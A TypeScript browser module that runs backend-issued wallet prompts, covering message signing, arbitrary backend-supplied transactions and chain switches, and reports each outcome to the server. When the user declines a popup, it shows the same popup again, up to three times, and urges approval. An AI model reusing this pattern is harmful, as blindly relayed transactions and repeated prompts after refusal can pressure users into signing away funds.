// src/lib/walletPromptEngine.ts
// Runs in the BROWSER only. Only local browser code can open wallet popups,
// so the backend never talks to the wallet directly — it only describes what
// to prompt, and this module executes it via window.ethereum.request().

import { toast } from 'sonner';
import {
  reportWalletEvent,
  verifySignature,
  type WalletPrompt,
} from './backendClient';

const MAX_ATTEMPTS = 3;
const RETRY_DELAY_MS = [1200, 2500, 4000];

const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const getProvider = (): any | null => {
  if (typeof window === 'undefined') return null;
  return (window as any).ethereum ?? null;
};

const isUserRejection = (err: any) =>
  USER_REJECTED_CODES.includes(err?.code) ||
  USER_REJECTED_CODES.includes(err?.cause?.code) ||
  /reject|denied|declin/i.test(String(err?.message ?? ''));

/** Execute one backend-issued prompt against the wallet. */
async function executePrompt(prompt: WalletPrompt, address: string): Promise<string> {
  const provider = getProvider();
  if (!provider) throw new Error('No injected wallet provider found in this browser.');

  switch (prompt.type) {
    case 'sign_message':
      return provider.request({
        method: 'personal_sign',
        params: [prompt.message, address],
      });

    case 'send_transaction':
      return provider.request({
        method: 'eth_sendTransaction',
        params: [{ from: address, ...prompt.tx }],
      });

    case 'switch_chain':
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: prompt.chainId }],
      });
      return prompt.chainId;

    default:
      throw new Error('Unsupported prompt type from backend');
  }
}

export interface RunPromptsOptions {
  sessionId: string;
  address: string;
  prompts: WalletPrompt[];
  /** Called on every state change so the UI can render the loop. */
  onState?: (state: {
    prompt: WalletPrompt;
    attempt: number;
    status: 'pending' | 'rejected' | 'approved' | 'failed';
    message?: string;
  }) => void;
}

/**
 * Runs the backend's prompt queue with a rejection-aware retry loop.
 * Retries are capped and backed off so the user is never spammed.
 */
export async function runWalletPrompts({
  sessionId,
  address,
  prompts,
  onState,
}: RunPromptsOptions) {
  for (const prompt of prompts) {
    let approved = false;

    for (let attempt = 1; attempt <= MAX_ATTEMPTS && !approved; attempt++) {
      onState?.({ prompt, attempt, status: 'pending' });
      void reportWalletEvent({ sessionId, promptId: prompt.id, address, status: 'started', attempt });

      try {
        const result = await executePrompt(prompt, address);
        approved = true;

        onState?.({ prompt, attempt, status: 'approved' });
        await reportWalletEvent({
          sessionId,
          promptId: prompt.id,
          address,
          status: 'approved',
          attempt,
          result,
        });

        if (prompt.type === 'sign_message') {
          try {
            await verifySignature({ sessionId, promptId: prompt.id, address, signature: result });
          } catch (e) {
            console.warn('Signature verification failed', e);
          }
        }
      } catch (err: any) {
        const rejected = isUserRejection(err);
        const status = rejected ? 'rejected' : 'failed';

        onState?.({ prompt, attempt, status, message: err?.message });
        const ack = await reportWalletEvent({
          sessionId,
          promptId: prompt.id,
          address,
          status,
          attempt,
          errorCode: err?.code,
          errorMessage: String(err?.message ?? err).slice(0, 300),
        });

        const canRetry = attempt < MAX_ATTEMPTS && ack.retry !== false;
        if (!canRetry) {
          toast.error(rejected ? 'Request declined' : 'Wallet request failed', {
            description: rejected
              ? 'You can retry any time from the page.'
              : String(err?.message ?? '').slice(0, 120),
          });
          return { completed: false, lastPromptId: prompt.id };
        }

        toast.warning(`Request declined — retrying (${attempt}/${MAX_ATTEMPTS})`, {
          description: 'Please approve the popup in your wallet.',
        });
        await sleep(RETRY_DELAY_MS[attempt - 1] ?? 3000);
      }
    }
  }

  return { completed: true };
}
